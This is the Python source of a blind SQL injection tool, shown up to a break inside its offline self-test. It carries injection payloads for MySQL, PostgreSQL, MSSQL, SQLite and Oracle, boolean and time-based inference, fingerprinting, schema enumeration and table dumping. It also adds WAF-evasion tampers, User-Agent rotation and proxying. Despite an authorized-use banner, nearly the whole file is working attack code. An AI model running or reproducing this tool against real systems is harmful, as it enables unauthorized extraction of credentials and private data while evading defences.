#!/usr/bin/env python3
"""
blind_sqli.py - Blind SQL injection extraction framework.

============================================================================
 AUTHORIZED USE ONLY
----------------------------------------------------------------------------
 For use during authorized security assessments only (signed scope of
 engagement / written permission). Running this against systems you are not
 explicitly authorized to test is illegal in most jurisdictions. Stay within
 the agreed scope, rate limits, and testing window. Keep your authorization
 letter handy.
============================================================================

Extracts data from a single confirmed blind SQLi point by asking the
application true/false questions and inferring answers from the response.

Headline features
------------------
  * Two oracles:
      - boolean   (content marker / HTTP status / fuzzy body-length ratio)
      - time      (conditional sleep, statistical threshold)
      - auto      (calibrate boolean, fall back to time)
  * Concurrency: thread pool + token-bucket rate limiter (cap req/s even with
    many workers). Character extraction is flattened into one big task pool.
  * Bitwise extraction: each character resolved with `bits` independent
    boolean queries (parallel-friendly), or classic binary search.
  * DBMS dialects: mysql, postgres, mssql, sqlite, oracle (+ auto-fingerprint)
  * Actions: fingerprint, banner, current-db, dbs, tables, columns, dump
  * WAF evasion: tamper pipeline, random User-Agent, proxy, jitter/delay.
  * Request shaping: --url/--param OR raw HTTP request file (-r) with a {q}
    injection marker anywhere (URL, header, body).
  * Resume: cell-level JSON checkpoint (stop and restart without re-querying).
  * Output: pretty TSV (stdout), CSV, or JSON.
  * Offline self-test (--self-test): drives the full extraction engine against
    an in-memory SQLite DB. No network, no target. Proves the logic works.

Examples
--------
  # Verify the engine works (no target needed):
  python3 blind_sqli.py --self-test

  # Dump users, MySQL, content oracle, 8 workers capped at 10 req/s:
  python3 blind_sqli.py --url https://t/search --param q \
      --template "widget' AND ({cond})-- -" --dbms mysql \
      --true-string "results found" --threads 8 --rps 10 \
      --action dump --db appdb --table users

  # Time-based, auto-fingerprint, from a Burp request file with a {q} marker:
  python3 blind_sqli.py -r req.txt --technique time --dbms auto \
      --tamper space2comment,randomcase --random-agent \
      --proxy http://127.0.0.1:8080 --action banner

Dependencies: requests (only for live targets; self-test uses stdlib only).
"""

import argparse
import csv
import json
import os
import random
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote as urlquote

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except Exception:  # pragma: no cover - requests optional for self-test
    requests = None


# ==========================================================================
# Logging / colors / stats
# ==========================================================================
class Log:
    LEVELS = {"error": 0, "warn": 1, "info": 2, "debug": 3}
    COLORS = {"error": "31", "warn": "33", "info": "36", "debug": "90", "ok": "32"}

    def __init__(self, level="info", color=True):
        self.level = self.LEVELS.get(level, 2)
        self.color = color and sys.stderr.isatty()

    def _c(self, s, code):
        return "\033[%sm%s\033[0m" % (code, s) if self.color else s

    def _emit(self, lvl, msg, code):
        if self.LEVELS[lvl] <= self.level:
            sys.stderr.write(self._c(msg, code) + "\n")
            sys.stderr.flush()

    def error(self, m): self._emit("error", "[-] " + m, self.COLORS["error"])
    def warn(self, m):  self._emit("warn", "[!] " + m, self.COLORS["warn"])
    def info(self, m):  self._emit("info", "[*] " + m, self.COLORS["info"])
    def ok(self, m):    self._emit("info", "[+] " + m, self.COLORS["ok"])
    def debug(self, m): self._emit("debug", "[.] " + m, self.COLORS["debug"])


LOG = Log()


class Stats:
    def __init__(self):
        self.requests = 0
        self.start = time.monotonic()
        self.lock = threading.Lock()

    def inc(self):
        with self.lock:
            self.requests += 1

    def rate(self):
        dt = max(1e-6, time.monotonic() - self.start)
        return self.requests / dt

    def summary(self):
        dt = time.monotonic() - self.start
        return "requests=%d  elapsed=%.1fs  avg=%.1f req/s" % (
            self.requests, dt, self.rate())


# ==========================================================================
# Token-bucket rate limiter (thread-safe). 0 disables.
# ==========================================================================
class RateLimiter:
    def __init__(self, rps):
        self.rps = float(rps)
        self.allowance = self.rps
        self.last = time.monotonic()
        self.lock = threading.Lock()

    def acquire(self):
        if self.rps <= 0:
            return
        while True:
            with self.lock:
                now = time.monotonic()
                self.allowance = min(self.rps, self.allowance + (now - self.last) * self.rps)
                self.last = now
                if self.allowance >= 1:
                    self.allowance -= 1
                    return
                wait = (1 - self.allowance) / self.rps
            time.sleep(wait)


# ==========================================================================
# Tamper functions (WAF evasion). Operate on the final injected value.
# Opt in with --tamper a,b,c . Caveats noted; some may break payloads.
# ==========================================================================
def _t_space2comment(s): return s.replace(" ", "/**/")
def _t_space2plus(s):    return s.replace(" ", "+")          # GET query only
def _t_equaltolike(s):   return s.replace("=", " LIKE ")     # may change semantics
def _t_charencode(s):    return "".join("%%%02x" % ord(c) for c in s)  # raw mode + --no-urlencode


def _t_randomcase(s):
    # Randomize letter case. SQL keywords are case-insensitive, but avoid the
    # postgres dollar-quote tag region ($blind$...$blind$) which is case-sensitive.
    out, i = [], 0
    while i < len(s):
        if s[i] == "$":
            j = s.find("$", i + 1)
            if j != -1:
                out.append(s[i:j + 1])
                i = j + 1
                continue
        ch = s[i]
        out.append(random.choice([ch.upper(), ch.lower()]) if ch.isalpha() else ch)
        i += 1
    return "".join(out)


TAMPERS = {
    "space2comment": _t_space2comment,
    "space2plus": _t_space2plus,
    "equaltolike": _t_equaltolike,
    "charencode": _t_charencode,
    "randomcase": _t_randomcase,
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile Safari/604.1",
]


# ==========================================================================
# DBMS dialects
# ==========================================================================
# Each dialect describes how to build the SQL fragments we need. Embedded
# string literals are avoided in favor of make_string_literal() so payloads
# never collide with the outer quote/comment style.
DIALECTS = {
    "mysql": {
        "substr": "ASCII(SUBSTRING(({expr}),{pos},1))",
        "length": "LENGTH(({expr}))",
        "byte_substr": "ASCII(SUBSTRING(CONVERT(({expr}) USING binary),{pos},1))",
        "byte_length": "LENGTH(({expr}))",
        "bit_test": "(({expr}) & {mask})>0",
        "time_wrap": "(({c}) AND SLEEP({d}))",
        "version": "SELECT @@version",
        "current_user": "SELECT CURRENT_USER()",
        "current_db": "SELECT DATABASE()",
        "hostname": "SELECT @@hostname",
        "count_dbs": "SELECT COUNT(*) FROM information_schema.schemata",
        "list_dbs": "SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {off}",
        "count_tables": "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema={db}",
        "list_tables": "SELECT table_name FROM information_schema.tables WHERE table_schema={db} LIMIT 1 OFFSET {off}",
        "count_cols": "SELECT COUNT(*) FROM information_schema.columns WHERE table_schema={db} AND table_name={tbl}",
        "list_cols": "SELECT column_name FROM information_schema.columns WHERE table_schema={db} AND table_name={tbl} LIMIT 1 OFFSET {off}",
        "count_rows": "SELECT COUNT(*) FROM {frm}",
        "row_value": "SELECT {col} FROM {frm} LIMIT 1 OFFSET {off}",
    },
    "postgres": {
        "substr": "ASCII(SUBSTRING(({expr}),{pos},1))",
        "length": "LENGTH(({expr}))",
        "byte_substr": "GET_BYTE(CONVERT_TO(({expr}),$blind$UTF8$blind$),{pos0})",
        "byte_length": "OCTET_LENGTH(({expr}))",
        "bit_test": "(({expr}) & {mask})>0",
        "time_wrap": "((CASE WHEN ({c}) THEN pg_sleep({d}) ELSE pg_sleep(0) END)::text='')",
        "version": "SELECT version()",
        "current_user": "SELECT current_user",
        "current_db": "SELECT current_database()",
        "hostname": "SELECT COALESCE(host(inet_server_addr()),{lit_local})",
        "count_dbs": "SELECT COUNT(*) FROM pg_database",
        "list_dbs": "SELECT datname FROM pg_database LIMIT 1 OFFSET {off}",
        "count_tables": "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema={db}",
        "list_tables": "SELECT table_name FROM information_schema.tables WHERE table_schema={db} LIMIT 1 OFFSET {off}",
        "count_cols": "SELECT COUNT(*) FROM information_schema.columns WHERE table_schema={db} AND table_name={tbl}",
        "list_cols": "SELECT column_name FROM information_schema.columns WHERE table_schema={db} AND table_name={tbl} LIMIT 1 OFFSET {off}",
        "count_rows": "SELECT COUNT(*) FROM {frm}",
        "row_value": "SELECT {col} FROM {frm} LIMIT 1 OFFSET {off}",
    },
    "mssql": {
        "substr": "UNICODE(SUBSTRING(CAST(({expr}) AS NVARCHAR(MAX)),{pos},1))",
        "length": "LEN(CAST(({expr}) AS NVARCHAR(MAX)))",
        "bit_test": "(({expr}) & {mask})>0",
        # WAITFOR is statement-level; this default assumes a stacked-query
        # context, e.g. --template "1';{cond}-- -". See README time recipes.
        "time_wrap": "IF(({c}))WAITFOR DELAY '0:0:{d}'",
        "version": "SELECT @@version",
        "current_user": "SELECT SYSTEM_USER",
        "current_db": "SELECT DB_NAME()",
        "hostname": "SELECT @@SERVERNAME",
        "count_dbs": "SELECT COUNT(*) FROM sys.databases",
        "list_dbs": "SELECT name FROM sys.databases ORDER BY name OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY",
        "count_tables": "SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog={db}",
        "list_tables": "SELECT table_name FROM information_schema.tables WHERE table_catalog={db} ORDER BY table_name OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY",
        "count_cols": "SELECT COUNT(*) FROM information_schema.columns WHERE table_name={tbl}",
        "list_cols": "SELECT column_name FROM information_schema.columns WHERE table_name={tbl} ORDER BY column_name OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY",
        "count_rows": "SELECT COUNT(*) FROM {frm}",
        "row_value": "SELECT {col} FROM {frm} ORDER BY 1 OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY",
    },
    "sqlite": {
        "substr": "UNICODE(SUBSTR(({expr}),{pos},1))",
        "length": "LENGTH(({expr}))",
        "bit_test": "(({expr}) & {mask})>0",
        # No SLEEP in sqlite; time-based needs a custom --time-template.
        "time_wrap": None,
        "version": "SELECT sqlite_version()",
        "current_user": "SELECT {lit_na}",
        "current_db": "SELECT {lit_main}",
        "hostname": "SELECT {lit_na}",
        "count_dbs": "SELECT 1",
        "list_dbs": "SELECT {lit_main} LIMIT 1 OFFSET {off}",
        "count_tables": "SELECT COUNT(*) FROM sqlite_master WHERE type={lit_table}",
        "list_tables": "SELECT name FROM sqlite_master WHERE type={lit_table} LIMIT 1 OFFSET {off}",
        "count_cols": "SELECT COUNT(*) FROM pragma_table_info({tbl})",
        "list_cols": "SELECT name FROM pragma_table_info({tbl}) LIMIT 1 OFFSET {off}",
        "count_rows": "SELECT COUNT(*) FROM {frm}",
        "row_value": "SELECT {col} FROM {frm} LIMIT 1 OFFSET {off}",
    },
    "oracle": {
        "substr": "ASCII(SUBSTR(({expr}),{pos},1))",
        "length": "LENGTH(({expr}))",
        "bit_test": "(BITAND(({expr}),{mask}))>0",
        "time_wrap": "(SELECT CASE WHEN ({c}) THEN dbms_pipe.receive_message(CHR(65),{d}) ELSE 1 END FROM dual)=1",
        "version": "SELECT banner FROM v$version WHERE ROWNUM=1",
        "current_user": "SELECT user FROM dual",
        "current_db": "SELECT global_name FROM global_name",
        "hostname": "SELECT host_name FROM v$instance",
        "count_dbs": "SELECT COUNT(*) FROM all_users",
        "list_dbs": "SELECT username FROM all_users ORDER BY username OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY",
        "count_tables": "SELECT COUNT(*) FROM all_tables WHERE owner={db}",
        "list_tables": "SELECT table_name FROM all_tables WHERE owner={db} ORDER BY table_name OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY",
        "count_cols": "SELECT COUNT(*) FROM all_tab_columns WHERE owner={db} AND table_name={tbl}",
        "list_cols": "SELECT column_name FROM all_tab_columns WHERE owner={db} AND table_name={tbl} ORDER BY column_name OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY",
        "count_rows": "SELECT COUNT(*) FROM {frm}",
        "row_value": "SELECT {col} FROM {frm} ORDER BY 1 OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY",
    },
}

# Conditions that are syntactically valid AND true only on the matching DBMS.
# On the wrong DBMS they error -> rendered false. First TRUE wins.
FINGERPRINTS = {
    "mysql": "CONNECTION_ID()=CONNECTION_ID()",
    "postgres": "(SELECT 1)::int=1",
    "mssql": "@@SERVERNAME=@@SERVERNAME",
    "oracle": "(SELECT 1 FROM dual WHERE ROWNUM=1)=1",
    "sqlite": "sqlite_version()=sqlite_version()",
}


def make_string_literal(dbms, s):
    """Encode a Python string as a quote-free SQL literal for the dialect."""
    if s == "":
        return "''"
    if dbms == "mysql":
        return "0x" + s.encode("utf-8").hex()
    if dbms == "postgres":
        return "$blind$" + s + "$blind$"
    if dbms == "sqlite":
        return "CHAR(" + ",".join(str(ord(c)) for c in s) + ")"
    if dbms == "mssql":
        return "+".join("CHAR(%d)" % ord(c) for c in s)
    if dbms == "oracle":
        return "||".join("CHR(%d)" % ord(c) for c in s)
    raise ValueError("unknown dbms %r" % dbms)


# ==========================================================================
# Raw HTTP request file (Burp-style) with an injection marker.
# ==========================================================================
class RawRequest:
    def __init__(self, method, url, headers, body, marker):
        self.method = method
        self.url = url
        self.headers = headers
        self.body = body
        self.marker = marker

    @classmethod
    def from_file(cls, path, marker, scheme):
        raw = open(path, "r", encoding="utf-8", errors="replace").read()
        raw = raw.replace("\r\n", "\n")
        head, _, body = raw.partition("\n\n")
        lines = head.split("\n")
        method, target, _ = (lines[0].split(" ") + ["", ""])[:3]
        headers = {}
        host = None
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip()] = v.strip()
                if k.strip().lower() == "host":
                    host = v.strip()
        if target.startswith("http"):
            url = target
        else:
            if not host:
                raise SystemExit("raw request has no Host header and a relative path")
            url = "%s://%s%s" % (scheme, host, target)
        return cls(method.upper(), url, headers, body if body else None, marker)

    def build(self, value, urlencode=True):
        v_url = urlquote(value, safe="") if urlencode else value
        url = self.url.replace(self.marker, v_url)
        headers = {k: w.replace(self.marker, value) for k, w in self.headers.items()}
        body = self.body.replace(self.marker, value) if self.body is not None else None
        return self.method, url, headers, body


# ==========================================================================
# Requester: turns an injected value into (status, text, elapsed).
# ==========================================================================
class Requester:
    def __init__(self, args):
        self.args = args
        self.stats = Stats()
        self.rl = RateLimiter(args.rps)
        self.backend = "requests" if requests is not None else "urllib"
        if self.backend == "requests":
            self.session = requests.Session()
            self.session.verify = not args.insecure
            if args.proxy:
                self.session.proxies = {"http": args.proxy, "https": args.proxy}
        else:
            LOG.warn("'requests' not installed; using the stdlib urllib backend (no TLS verification control).")
        self.tampers = [TAMPERS[t] for t in (args.tamper.split(",") if args.tamper else []) if t in TAMPERS]

        self.base_headers = {}
        for h in args.header or []:
            if ":" in h:
                k, v = h.split(":", 1)
                self.base_headers[k.strip()] = v.strip()
        if args.cookie:
            self.base_headers["Cookie"] = args.cookie

        self.base_params = {}
        if args.param_data:
            for pair in args.param_data.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    self.base_params[k] = v

        self.raw = RawRequest.from_file(args.request_file, args.marker, args.scheme) if args.request_file else None

    def _tamper(self, value):
        for fn in self.tampers:
            value = fn(value)
        return value

    def send(self, value):
        value = self._tamper(value)
        self.rl.acquire()
        d = self.args.delay + (random.uniform(0, self.args.jitter) if self.args.jitter else 0)
        if d > 0:
            time.sleep(d)

        headers = dict(self.base_headers)
        if self.args.random_agent:
            headers["User-Agent"] = random.choice(USER_AGENTS)

        # Normalize the request into a transport-agnostic shape.
        if self.raw:
            method, url, h, body = self.raw.build(value, urlencode=not self.args.no_urlencode)
            headers.update(h)
            req = {"method": method, "url": url, "params": None, "data": body, "json": None}
        else:
            params = dict(self.base_params)
            params[self.args.param] = value
            method = self.args.method.upper()
            req = {"method": method, "url": self.args.url, "params": None, "data": None, "json": None}
            if method == "GET":
                req["params"] = params
            elif self.args.json:
                req["json"] = params
            else:
                req["data"] = params
        req["headers"] = headers

        last = None
        for attempt in range(self.args.retries + 1):
            try:
                t0 = time.monotonic()
                status, text = (self._send_requests(req) if self.backend == "requests"
                                else self._send_urllib(req))
                elapsed = time.monotonic() - t0
                self.stats.inc()
                return status, text, elapsed
            except Exception as e:  # transient drop / WAF reset
                last = e
                time.sleep(min(5.0, 1.0 + attempt))
        raise RuntimeError("request failed after %d retries: %s" % (self.args.retries, last))

    def _send_requests(self, req):
        kwargs = {"headers": req["headers"], "timeout": self.args.timeout,
                  "allow_redirects": self.args.follow_redirects}
        for k in ("params", "data", "json"):
            if req[k] is not None:
                kwargs[k] = req[k]
        resp = self.session.request(req["method"], req["url"], **kwargs)
        return resp.status_code, resp.text

    def _send_urllib(self, req):
        import urllib.request
        import urllib.parse
        import urllib.error

        url = req["url"]
        if req["params"]:
            url += ("&" if "?" in url else "?") + urllib.parse.urlencode(req["params"])
        headers = dict(req["headers"])
        body = None
        if req["json"] is not None:
            body = json.dumps(req["json"]).encode()
            headers.setdefault("Content-Type", "application/json")
        elif req["data"] is not None:
            if isinstance(req["data"], dict):
                body = urllib.parse.urlencode(req["data"]).encode()
                headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
            else:
                body = req["data"].encode()

        handlers = []
        if self.args.proxy:
            handlers.append(urllib.request.ProxyHandler({"http": self.args.proxy, "https": self.args.proxy}))
        if not self.args.follow_redirects:
            class _NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, *a, **k):
                    return None
            handlers.append(_NoRedirect())
        opener = urllib.request.build_opener(*handlers)
        r = urllib.request.Request(url, data=body, headers=headers, method=req["method"])
        try:
            resp = opener.open(r, timeout=self.args.timeout)
            return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:  # 4xx/5xx are valid oracle signals
            return e.code, e.read().decode("utf-8", "replace")


# ==========================================================================
# Oracle: answers is_true(cond) for a SQL boolean condition.
# ==========================================================================
class Oracle:
    TRUE_COND = "1=1"
    FALSE_COND = "1=2"

    def __init__(self, requester, args, dialect):
        self.req = requester
        self.args = args
        self.dialect = dialect
        self.technique = None          # 'boolean' | 'time'
        self.bmode = None              # 'marker' | 'status' | 'length'
        self.marker = args.true_string
        self.true_status = None
        self.true_len = None
        self.false_len = None
        self.time_delay = args.time_delay
        self.time_threshold = None
        self.time_template = args.time_template or dialect.get("time_wrap")

    def _payload(self, cond):
        return self.args.template.replace("{cond}", cond)

    # -- calibration --------------------------------------------------------
    def calibrate(self):
        want = self.args.technique
        if want in ("boolean", "auto"):
            if self._calibrate_boolean():
                self.technique = "boolean"
                return
            if want == "boolean":
                raise SystemExit("Could not calibrate a boolean oracle. Try --true-string or --technique time.")
            LOG.warn("Boolean calibration failed; falling back to time-based.")
        if want in ("time", "auto"):
            self._calibrate_time()
            self.technique = "time"
            return
        raise SystemExit("Unknown --technique %r" % want)

    def _calibrate_boolean(self):
        _, t_text, _ = self.req.send(self._payload(self.TRUE_COND))
        f_status, f_text, _ = self.req.send(self._payload(self.FALSE_COND))
        t_status = None
        # re-send true to also capture status reliably
        t_status, t_text, _ = self.req.send(self._payload(self.TRUE_COND))

        if self.marker is not None:
            if (self.marker in t_text) and (self.marker not in f_text):
                self.bmode = "marker"
                LOG.ok("Boolean oracle: TRUE-marker string present only in true responses.")
                return True
            LOG.warn("--true-string did not cleanly separate true/false; trying status/length.")
        if t_status != f_status:
            self.bmode = "status"
            self.true_status = t_status
            LOG.ok("Boolean oracle: HTTP status (true=%s, false=%s)." % (t_status, f_status))
            return True
        if abs(len(t_text) - len(f_text)) >= self.args.len_threshold:
            self.bmode = "length"
            self.true_len, self.false_len = len(t_text), len(f_text)
            LOG.ok("Boolean oracle: body length (true=%d, false=%d)." % (len(t_text), len(f_text)))
            return True
        LOG.debug("true len=%d status=%s / false len=%d status=%s" % (len(t_text), t_status, len(f_text), f_status))
        return False

    def _calibrate_time(self):
        if not self.time_template:
            raise SystemExit("No time-based template for this DBMS. Supply --time-template with {c} and {d}.")
        # Baseline latency from fast (false) requests.
        base = []
        for _ in range(self.args.time_samples):
            _, _, el = self.req.send(self._payload(self._time_cond(self.FALSE_COND)))
            base.append(el)
        baseline = max(base)
        self.time_threshold = baseline + self.time_delay * 0.6
        # Verify a true condition actually sleeps.
        _, _, el = self.req.send(self._payload(self._time_cond(self.TRUE_COND)))
        LOG.ok("Time oracle: baseline=%.2fs delay=%ss threshold=%.2fs (true probe=%.2fs)" % (
            baseline, self.time_delay, self.time_threshold, el))
        if el < self.time_threshold:
            LOG.warn("True probe did not exceed threshold; time-based may be unreliable here.")

    def _time_cond(self, cond):
        return self.time_template.format(c=cond, d=self.time_delay)

    # -- the query ----------------------------------------------------------
    def is_true(self, cond):
        if self.technique == "time":
            _, _, el = self.req.send(self._payload(self._time_cond(cond)))
            return el >= self.time_threshold
        status, text, _ = self.req.send(self._payload(cond))
        if self.bmode == "marker":
            return self.marker in text
        if self.bmode == "status":
            return status == self.true_status
        if self.bmode == "length":
            return abs(len(text) - self.true_len) < abs(len(text) - self.false_len)
        raise RuntimeError("oracle not calibrated")

    def preview(self):
        sample = "ASCII(SUBSTRING((SELECT 1),1,1))>64"
        LOG.info("DRY RUN - boolean payload would be:")
        print(self._payload(sample))
        if self.time_template:
            LOG.info("DRY RUN - time payload would be:")
            print(self._payload(self._time_cond(sample)))


# ==========================================================================
# Checkpoint: cell-level resume (string keys -> extracted values).
# ==========================================================================
class Checkpoint:
    def __init__(self, path):
        self.path = path
        self.data = {}
        self.lock = threading.Lock()
        self._n = 0
        if path and os.path.exists(path):
            try:
                self.data = json.load(open(path))
                LOG.info("Resuming: %d cached cells from %s" % (len(self.data), path))
            except Exception:
                LOG.warn("Could not read checkpoint %s; starting fresh." % path)

    def set(self, key, val):
        if not self.path:
            return
        with self.lock:
            self.data[key] = val
            self._n += 1
            if self._n % 25 == 0:
                self._flush()

    def close(self):
        if self.path:
            with self.lock:
                self._flush()

    def _flush(self):
        tmp = self.path + ".tmp"
        json.dump(self.data, open(tmp, "w"))
        os.replace(tmp, self.path)


# ==========================================================================
# Extractor: binary/bitwise extraction + enumeration + dump, parallelized.
# ==========================================================================
class Extractor:
    def __init__(self, oracle, dbms, threads=1, bitwise=True, bits=8,
                 checkpoint=None, max_codepoint=127, byte_mode=False):
        self.oracle = oracle
        self.dbms = dbms
        self.d = DIALECTS[dbms]
        self.threads = max(1, threads)
        self.bitwise = bitwise
        self.bits = bits
        self.max_codepoint = max_codepoint
        self.byte_mode = byte_mode
        if byte_mode and "byte_substr" not in self.d:
            raise SystemExit("Byte mode (--bytes) is only implemented for: " +
                             ", ".join(k for k, v in DIALECTS.items() if "byte_substr" in v))
        self.cp = checkpoint or Checkpoint(None)

    # -- dialect formatting with auto-injected common literals --------------
    def fmt(self, key, **kw):
        extras = {
            "lit_table": make_string_literal(self.dbms, "table"),
            "lit_main": make_string_literal(self.dbms, "main"),
            "lit_na": make_string_literal(self.dbms, "n/a"),
            "lit_local": make_string_literal(self.dbms, "localhost"),
        }
        extras.update(kw)
        return self.d[key].format(**extras)

    def lit(self, s):
        return make_string_literal(self.dbms, s)

    # -- parallel helpers ---------------------------------------------------
    def _pmap(self, items, fn):
        if self.threads == 1 or len(items) <= 1:
            return [fn(x) for x in items]
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            return list(ex.map(fn, items))

    # -- primitives ---------------------------------------------------------
    def extract_int(self, expr, cap=2 ** 31):
        gt = lambda n: self.oracle.is_true("(%s)>%d" % (expr, n))
        hi = 1
        while gt(hi):
            hi *= 2
            if hi > cap:
                break
        lo = 0
        while lo < hi:
            mid = (lo + hi) // 2
            if gt(mid):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _search_int(self, expr, lo, hi):
        """Binary search for an integer in [lo, hi] given an `expr`."""
        while lo < hi:
            mid = (lo + hi) // 2
            if self.oracle.is_true("(%s)>%d" % (expr, mid)):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _bitwise_int(self, expr, nbits):
        val = 0
        for k in range(nbits):
            mask = 1 << k
            if self.oracle.is_true(self.d["bit_test"].format(expr=expr, mask=mask)):
                val |= mask
        return val

    def extract_char(self, expr, pos):
        code_expr = self.d["substr"].format(expr=expr, pos=pos)
        if self.max_codepoint <= 255 and self.bitwise:
            val = self._bitwise_int(code_expr, self.bits)
        else:
            # ASCII fast path: most data is < 128, so probe once and shrink.
            hi = self.max_codepoint
            if hi > 127 and not self.oracle.is_true("(%s)>127" % code_expr):
                hi = 127
            val = self._search_int(code_expr, 0, hi)
        return chr(val) if val else ""

    def extract_byte(self, expr, pos):
        byte_expr = self.d["byte_substr"].format(expr=expr, pos=pos, pos0=pos - 1)
        if self.bitwise:
            return self._bitwise_int(byte_expr, 8)
        return self._search_int(byte_expr, 0, 255)

    def extract_strings(self, cells):
        """cells: list of {'key': str, 'expr': str}. Returns list of values.

        Two flat phases for maximum concurrency:
          A) resolve every cell's length (binary search; cells run in parallel)
          B) resolve every (cell, position) char (one big task pool)
        """
        results = [None] * len(cells)
        todo = []
        for i, c in enumerate(cells):
            if c["key"] in self.cp.data:
                results[i] = self.cp.data[c["key"]]
            else:
                todo.append(i)
        if not todo:
            return results

        length_key = "byte_length" if self.byte_mode else "length"

        # Phase A: lengths (byte length in byte mode, else char length)
        lens = self._pmap(todo, lambda i: self.extract_int(
            self.d[length_key].format(expr=cells[i]["expr"]), cap=65536))
        length_of = dict(zip(todo, lens))

        # Phase B: positions (flat task pool over every position of every cell)
        fill = 0 if self.byte_mode else ""
        buffers = {i: [fill] * length_of[i] for i in todo}
        unit = self.extract_byte if self.byte_mode else self.extract_char
        tasks = [(i, pos) for i in todo for pos in range(1, length_of[i] + 1)]

        def do_unit(t):
            i, pos = t
            buffers[i][pos - 1] = unit(cells[i]["expr"], pos)  # distinct slot, thread-safe

        self._pmap(tasks, do_unit)

        for i in todo:
            if self.byte_mode:
                val = bytes(buffers[i]).decode("utf-8", "replace")
            else:
                val = "".join(buffers[i])
            results[i] = val
            self.cp.set(cells[i]["key"], val)
        return results

    # -- high level ---------------------------------------------------------
    def fingerprint(self):
        for name, cond in FINGERPRINTS.items():
            try:
                if self.oracle.is_true(cond):
                    return name
            except Exception:
                continue
        return None

    def scalar(self, key, expr):
        return self.extract_strings([{"key": key, "expr": expr}])[0]

    def banner(self):
        out = {}
        for field in ("version", "current_user", "current_db", "hostname"):
            if field in self.d:
                try:
                    out[field] = self.scalar("banner/" + field, self.fmt(field))
                except Exception as e:
                    out[field] = "(error: %s)" % e
        return out

    def current_db(self):
        return self.scalar("current_db", self.fmt("current_db"))

    def _collection(self, count_key, list_key, key_prefix, **fmtkw):
        n = self.extract_int(self.fmt(count_key, **fmtkw))
        LOG.ok("%s: %d item(s)" % (key_prefix, n))
        cells = [{"key": "%s/%d" % (key_prefix, i), "expr": self.fmt(list_key, off=i, **fmtkw)}
                 for i in range(n)]
        return self.extract_strings(cells)

    def list_dbs(self):
        return self._collection("count_dbs", "list_dbs", "db")

    def list_tables(self, db):
        return self._collection("count_tables", "list_tables", "tbl:%s" % db, db=self.lit(db))

    def list_columns(self, db, table):
        return self._collection("count_cols", "list_cols", "col:%s.%s" % (db, table),
                                db=self.lit(db or ""), tbl=self.lit(table))

    def dump(self, db, table, columns, where=None):
        base = "%s.%s" % (db, table) if (db and self.dbms != "sqlite") else table
        frm = "(SELECT * FROM %s WHERE %s) z" % (base, where) if where else base
        n = self.extract_int(self.fmt("count_rows", frm=frm))
        LOG.ok("%s: %d row(s)" % (base, n))
        cells = []
        for off in range(n):
            for col in columns:
                cells.append({"key": "row/%s/%d/%s" % (base, off, col),
                              "expr": self.fmt("row_value", col=col, frm=frm, off=off)})
        flat = self.extract_strings(cells)
        rows = []
        idx = 0
        for off in range(n):
            row = {}
            for col in columns:
                row[col] = flat[idx]
                idx += 1
            rows.append(row)
        return rows


# ==========================================================================
# Output
# ==========================================================================
def write_rows(rows, columns, output):
    if not rows:
        LOG.warn("No rows.")
        return
    fmt = "tsv"
    if output:
        if output.endswith(".json"):
            fmt = "json"
        elif output.endswith(".csv"):
            fmt = "csv"
    if fmt == "json":
        json.dump(rows, open(output, "w"), indent=2, ensure_ascii=False)
        LOG.ok("Wrote %d rows -> %s (json)" % (len(rows), output))
    elif fmt == "csv":
        with open(output, "w", newline="") as fh:
            w = csv.DictWriter(fh, fieldnames=columns)
            w.writeheader()
            w.writerows(rows)
        LOG.ok("Wrote %d rows -> %s (csv)" % (len(rows), output))
    else:
        widths = {c: max(len(c), *(len(str(r.get(c, ""))) for r in rows)) for c in columns}
        line = lambda vals: " | ".join(str(v).ljust(widths[c]) for c, v in zip(columns, vals))
        print(line(columns))
        print("-+-".join("-" * widths[c] for c in columns))
        for r in rows:
            print(line([r.get(c, "") for c in columns]))


# ==========================================================================
# Offline self-test: drive the engine against in-memory SQLite. No network.
# ==========================================================================
def self_test():
    import sqlite3
    LOG.info("Self-test: building in-memory SQLite target...")
    conn = sqlite3.connect(":memory:", check_same_thread=False)
    conn.executescript("""
        CREATE TABLE users (id INTEGER, username TEXT, password TEXT, email TEXT);
        INSERT INTO users VALUES (1,'admin','5f4dcc3b5aa765d61d8327deb882cf99','admin@corp.local');
        INSERT INTO users VALUES (2,'alice','e10adc3949ba59abbe56e057f20f883e','alice@corp.local');
        INSERT INTO users VALUES (3,'r00t','',  'r00t@corp.local');
        INSERT INTO users VALUES (4,'José','naïve🔑','jose@café.local');
        CREATE TABLE products (sku TEXT, price TEXT);
        INSERT INTO products VALUES ('A-1','9.99');
    """)
    db_lock = threading.Lock()

    class SqliteOracle:
        technique = "boolean"
        time_delay = 5
        time_template = None

        def is_true(self, cond):
            with db_lock:
                try:
